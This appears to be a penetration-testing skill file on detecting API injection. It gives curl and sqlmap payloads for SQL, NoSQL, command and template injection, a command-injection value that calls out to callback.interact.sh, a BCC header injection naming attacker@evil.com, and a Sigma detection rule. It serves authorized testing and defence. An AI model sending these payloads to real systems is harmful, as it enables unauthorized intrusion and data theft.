<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: detecting-api-injection-attacks
description: >-
  Detect and test API injection vulnerabilities including SQL injection, NoSQL
  injection, command injection, LDAP injection, and template injection through
  API parameters, headers, and request bodies.
domain: cybersecurity
subdomain: api-security
tags:
  - injection
  - api-security
  - owasp-api8
  - sqli
  - command-injection
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1059"]
  owasp-api: ["API8"]
  tools: ["curl", "sqlmap", "burp-suite", "nuclei"]
---

# Detecting API Injection Attacks

## Overview

API injection attacks occur when untrusted data is sent to an interpreter
as part of a command or query. APIs are particularly vulnerable because
they accept structured data (JSON, XML) that may be parsed into database
queries, OS commands, or template engines without proper sanitization.

## Prerequisites

- Tools: ["curl", "sqlmap", "burp-suite", "nuclei"]
- API endpoints that accept user-controlled input
- Knowledge of backend technology stack (SQL/NoSQL/OS)
- Authorized testing engagement with written scope

## Key Concepts

- **SQL injection**: Malicious SQL in query parameters or JSON fields
- **NoSQL injection**: Operator injection in MongoDB/DynamoDB queries
- **Command injection**: OS command execution via API parameters
- **Template injection**: SSTI through template-rendered API responses

## Workflow

### Step 1: SQL Injection via API Parameters

```bash
# JSON body SQL injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","password":"x"}' \
  https://target.com/api/login

# Query parameter injection
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api/users?sort=name%20OR%201=1--&order=ASC"

# UNION-based injection in search
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api/search?q=test'+UNION+SELECT+username,password+FROM+users--"

# Time-based blind SQLi
curl -s -o /dev/null -w "%{time_total}" \
  -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api/users?id=1'+AND+SLEEP(5)--"

# sqlmap with API endpoint
sqlmap -u "https://target.com/api/users?id=1" \
  --headers="Authorization: Bearer $TOKEN" \
  --level=3 --risk=2 --batch

# sqlmap with JSON body
sqlmap -u "https://target.com/api/search" \
  --data='{"query":"test","limit":10}' \
  --headers="Authorization: Bearer $TOKEN\nContent-Type: application/json" \
  --level=3 --risk=2 --batch
```

### Step 2: NoSQL Injection

```bash
# MongoDB operator injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
  https://target.com/api/login

# MongoDB regex injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^admin"},"password":{"$ne":""}}' \
  https://target.com/api/login

# Array injection for $in operator
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":{"$in":["1","2","3","4","5"]}}' \
  https://target.com/api/users

# $where JavaScript injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"$where":"this.password.match(/.*/)"}' \
  https://target.com/api/users
```

### Step 3: Command Injection

```bash
# Pipe injection in filename/path parameters
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename":"report.pdf;id"}' \
  https://target.com/api/export

# Backtick injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"hostname":"`whoami`"}' \
  https://target.com/api/network/ping

# $() injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target":"$(curl http://callback.interact.sh)"}' \
  https://target.com/api/network/resolve

# Newline injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com\nBCC:attacker@evil.com"}' \
  https://target.com/api/notifications/send
```

### Step 4: Server-Side Template Injection

```bash
# Jinja2/Twig template injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}' \
  https://target.com/api/users/me

# Check if response contains "49" (Jinja2/Twig)
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":"${7*7}"}' \
  https://target.com/api/render

# Freemarker injection
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"<#assign x=\"freemarker\">${x}"}' \
  https://target.com/api/templates/preview
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| SQL syntax in parameters | WAF | SQL keywords in request body |
| MongoDB operators | Application logs | $gt, $ne, $regex in JSON |
| Command metacharacters | Input validation | Semicolons, pipes, backticks |
| Template syntax | Application logs | {{ }}, ${}, <# #> in input |

```yaml
title: API Injection Attempt — SQL Keywords in Request Body
id: d0e1f2a3-b4c5-6789-defa-890123456789
status: experimental
description: Detects SQL injection keywords in API request bodies
logsource:
  category: webserver
detection:
  selection:
    cs-method:
      - POST
      - PUT
      - PATCH
    cs-body|re: '(?i)(UNION\s+SELECT|OR\s+1\s*=\s*1|AND\s+SLEEP|INTO\s+OUTFILE|INFORMATION_SCHEMA)'
  condition: selection
falsepositives:
  - API endpoints that legitimately process SQL-like query syntax
level: high
tags:
  - attack.t1190
  - attack.t1059
```

## Verification

- [ ] SQL injection tested on all input fields (body, query, headers)
- [ ] NoSQL injection tested with operator payloads
- [ ] Command injection tested on system-interacting endpoints
- [ ] SSTI tested with template syntax probes
- [ ] Parameterized queries confirmed in code review
- [ ] Input validation rejects injection metacharacters

## References

- [OWASP API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [OWASP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
